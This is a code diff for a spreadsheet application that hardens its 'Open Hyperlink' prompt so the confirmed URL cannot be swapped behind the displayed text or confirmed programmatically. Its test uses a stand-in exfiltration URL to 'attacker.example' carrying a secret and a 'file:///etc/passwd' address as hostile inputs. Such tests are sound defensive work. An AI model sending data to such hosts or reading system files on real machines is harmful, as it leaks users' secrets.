@@ -43,6 +43,9 @@ pub struct Dialog {
     picture_target: Option<(u64, usize)>,
     /// The dialog this one was opened from (Name Manager › New…): it comes back when this closes.
     back: Option<Box<Dialog>>,
+    /// Open Hyperlink: the address the prompt shows, which OK opens. Private, unlike `values`, so
+    /// `ui.dialog.set` can't swap it behind the text the user reads (#2181).
+    link: Option<String>,
     focus_initialized: bool,
 }
 
@@ -93,6 +96,7 @@ impl Dialog {
             picture_inbox: None,
             picture_target: None,
             back: None,
+            link: None,
             focus_initialized: false,
         }
     }
@@ -113,6 +117,7 @@ impl Dialog {
             picture_inbox: None,
             picture_target: None,
             back: None,
+            link: None,
             focus_initialized: false,
         }
     }
@@ -376,19 +381,18 @@ impl Dialog {
                     json!({"text": existing}),
                 )
             }
-            // Asks before a web or e-mail link leaves the workbook; OK runs `link.open`, which
-            // refuses anything but http, https and mailto.
+            // Asks before a web or e-mail link leaves the workbook. OK opens it through
+            // `Session::open_confirmed_link` (which refuses anything but http, https and mailto),
+            // not a command: `link.open` refuses web addresses for programmatic callers, and a
+            // dialog without a command can't be confirmed over the control channel (#2181).
             "openLink" => {
                 let url = params.get("url").and_then(Json::as_str).unwrap_or_default().to_string();
-                Dialog::form(
-                    "openLink",
-                    "Open Hyperlink",
-                    "link.open",
-                    vec![Note(format!(
-                        "This workbook asks to open the address below. Links can lead to harmful sites or start other programs: open it only if you trust the workbook.\n\n{url}"
-                    ))],
-                    json!({"url": url}),
-                )
+                let mut d = Dialog::custom("openLink", "Open Hyperlink", json!({"url": url}));
+                d.fields = vec![Note(format!(
+                    "This workbook asks to open the address below. Links can lead to harmful sites or start other programs: open it only if you trust the workbook.\n\n{url}"
+                ))];
+                d.link = Some(url);
+                d
             }
             "insertLink" => Dialog::form(
                 "insertLink",
@@ -1404,6 +1408,13 @@ pub fn show(app: &mut SheetApp, ctx: &egui::Context) {
         app.message = Some((d.title.clone(), "Return to the original worksheet to insert this picture, or cancel and choose another cell.".into()));
         confirm = false;
     }
+    if confirm && d.name == "openLink" {
+        confirm = false;
+        open = false;
+        if let Err(e) = open_confirmed_link(app, &d) {
+            app.message = Some((d.title.clone(), crate::clean_error(&e)));
+        }
+    }
     if confirm && let Some(cmd) = d.command {
         let params = build_params(&d);
         match app.run(cmd, params) {
@@ -1584,6 +1595,15 @@ fn paste_special_shortcuts(d: &mut Dialog, ctx: &egui::Context) {
             _ => true,
         });
     });
+}
+
+/// The user pressed OK in Open Hyperlink: opens the address the prompt showed (`d.link`), never
+/// one a caller edited into its values afterwards.
+fn open_confirmed_link(app: &mut SheetApp, d: &Dialog) -> Result<(), String> {
+    let url = d.link.as_deref().unwrap_or_default();
+    let r = app.session.open_confirmed_link(url).map(|_| ()).map_err(|e| e.to_string());
+    app.after_engine();
+    r
 }
 
 fn ok_cancel(ui: &mut egui::Ui, confirm: &mut bool, open: &mut bool) {
@@ -3164,6 +3184,34 @@ mod tests {
         let at = gridcraft_engine::core::CellRef::new(0, 0);
         assert!(gridcraft_engine::cmd::data::check_validation(&doc.wb, 0, at, "6").is_none());
         assert!(gridcraft_engine::cmd::data::check_validation(&doc.wb, 0, at, "4").is_some());
+    }
+
+    /// #2181: a programmatic `link.open` opens nothing; the Open Hyperlink prompt has no command
+    /// the control channel could confirm, and its OK opens exactly the address it showed.
+    #[test]
+    fn open_hyperlink_opens_only_the_address_the_user_confirmed() {
+        use std::{cell::RefCell, rc::Rc};
+        let opened = Rc::new(RefCell::new(Vec::<String>::new()));
+        let sink = opened.clone();
+        let services = crate::Services { open_url: Some(Box::new(move |u: &str| sink.borrow_mut().push(u.to_string()))), ..Default::default() };
+        let mut session = gridcraft_engine::Session::default();
+        session.new_workbook();
+        let mut app = SheetApp::new(session, services);
+        assert!(app.run("link.open", json!({"url": "https://attacker.example/?d=secret"})).is_err());
+        app.after_engine();
+        assert!(opened.borrow().is_empty(), "a programmatic link.open opens nothing");
+        assert!(app.dialog.is_none(), "and opens no dialog");
+
+        let mut d = Dialog::open(&mut app, "openLink", json!({"url": "https://example.org/a"})).unwrap();
+        assert!(d.command.is_none(), "`ui.dialog.confirm` can't press OK for the user");
+        // A value edited behind the prompt's text is ignored: OK opens what the user read.
+        d.set_value("url", json!("https://attacker.example/?d=secret"));
+        open_confirmed_link(&mut app, &d).unwrap();
+        assert_eq!(*opened.borrow(), vec!["https://example.org/a".to_string()]);
+
+        let bad = Dialog::open(&mut app, "openLink", json!({"url": "file:///etc/passwd"})).unwrap();
+        assert!(open_confirmed_link(&mut app, &bad).is_err());
+        assert_eq!(opened.borrow().len(), 1);
     }
 
     #[test]
